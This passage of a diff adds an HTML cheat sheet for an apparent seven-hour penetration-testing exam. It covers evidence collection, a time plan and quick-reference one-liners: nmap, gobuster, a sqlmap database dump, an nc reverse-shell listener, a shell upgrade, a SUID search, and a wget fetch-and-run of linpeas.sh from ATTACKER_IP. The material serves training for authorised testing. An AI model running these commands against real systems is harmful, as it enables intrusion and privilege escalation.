+4. Exploitation success (SQL data dump)
+5. Initial shell access (whoami, id)
+6. Privilege escalation (sudo -l output)
+7. Root access (cat /root/flag.txt)
+8. Network discovery (ifconfig, ip route)
+9. Sensitive files found (config.php with DB creds)
+
+# Use scrot or flameshot
+scrot -s screenshot.png
+flameshot gui</code></div>
+            </div>
+            
+            <div class="subsection">
+                <div class="subsection-title">Evidence Collection</div>
+                <div class="code-block"><code># Save all commands and outputs
+script pentest-session.log
+
+# When done
+exit
+
+# Save scan results
+nmap -A $TARGET_IP -oA full-scan
+
+# Save HTTP responses
+curl -v http://$TARGET_IP/ > http-response.txt 2>&1
+
+# Take notes in real-time
+# Use CherryTree, Obsidian, or simple text file</code></div>
+            </div>
+        </div>
+        
+        <!-- TIME MANAGEMENT -->
+        <div class="section" id="timeline">
+            <div class="section-title">⏰ Time Management (7 hours total)</div>
+            
+            <div class="timeline">
+                <strong>🕐 Hour 0:00 - 0:30 → Reconnaissance</strong>
+                <div class="checklist-item">- Port scanning (nmap)</div>
+                <div class="checklist-item">- Service enumeration</div>
+                <div class="checklist-item">- Directory enumeration (gobuster/ffuf)</div>
+                <div class="checklist-item">- Initial web fingerprinting</div>
+            </div>
+            
+            <div class="timeline">
+                <strong>🕐 Hour 0:30 - 2:00 → Web Vulnerability Testing</strong>
+                <div class="checklist-item">- SQL injection testing</div>
+                <div class="checklist-item">- XSS testing</div>
+                <div class="checklist-item">- LFI/RFI testing</div>
+                <div class="checklist-item">- Command injection</div>
+            </div>
+            
+            <div class="timeline">
+                <strong>🕐 Hour 2:00 - 3:00 → Authentication & IDOR</strong>
+                <div class="checklist-item">- Default credentials</div>
+                <div class="checklist-item">- Brute force attacks</div>
+                <div class="checklist-item">- IDOR testing</div>
+                <div class="checklist-item">- Session manipulation</div>
+            </div>
+            
+            <div class="timeline">
+                <strong>🕐 Hour 3:00 - 4:00 → Network Services</strong>
+                <div class="checklist-item">- SMB enumeration</div>
+                <div class="checklist-item">- SSH/FTP testing</div>
+                <div class="checklist-item">- Database access attempts</div>
+            </div>
+            
+            <div class="timeline">
+                <strong>🕐 Hour 4:00 - 5:30 → Exploitation & Post-Exploitation</strong>
+                <div class="checklist-item">- Get initial shell</div>
+                <div class="checklist-item">- Upgrade shell</div>
+                <div class="checklist-item">- System enumeration</div>
+                <div class="checklist-item">- Privilege escalation</div>
+                <div class="checklist-item">- Pivoting (if applicable)</div>
+            </div>
+            
+            <div class="timeline">
+                <strong>🕐 Hour 5:30 - 6:30 → Documentation</strong>
+                <div class="checklist-item">- Write vulnerability cards</div>
+                <div class="checklist-item">- Organize screenshots</div>
+                <div class="checklist-item">- Document exploitation steps</div>
+            </div>
+            
+            <div class="timeline">
+                <strong>🕐 Hour 6:30 - 7:00 → Final Review</strong>
+                <div class="checklist-item">- Review all findings</div>
+                <div class="checklist-item">- Check for missing information</div>
+                <div class="checklist-item">- Polish documentation</div>
+                <div class="checklist-item">- Submit report</div>
+            </div>
+            
+            <div class="warning">
+                <strong>⚠️ Important:</strong> If stuck for more than 30 minutes on one thing, move on and come back later!
+            </div>
+        </div>
+        
+        <!-- QUICK REFERENCE -->
+        <div class="section">
+            <div class="section-title">🚀 Quick Reference Commands</div>
+            
+            <div class="subsection">
+                <div class="subsection-title">Essential One-Liners</div>
+                <div class="code-block"><code># Quick scan
+nmap -sV -sC $TARGET_IP -oN scan.txt
+
+# Directory brute force
+gobuster dir -u http://$TARGET_IP -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
+
+# SQLmap quick test
+sqlmap -u "http://$TARGET_IP/page.php?id=1" --batch --dbs
+
+# Reverse shell listener
+nc -lvnp 4444
+
+# Upgrade shell
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+
+# SUID find
+find / -perm -4000 2>/dev/null
+
+# LinPEAS download and run
+wget http://ATTACKER_IP:8000/linpeas.sh && chmod +x linpeas.sh && ./linpeas.sh
+
+# Start HTTP server
+python3 -m http.server 8000</code></div>
+            </div>
+        </div>
+        
+    </div>
+</body>
+</html>
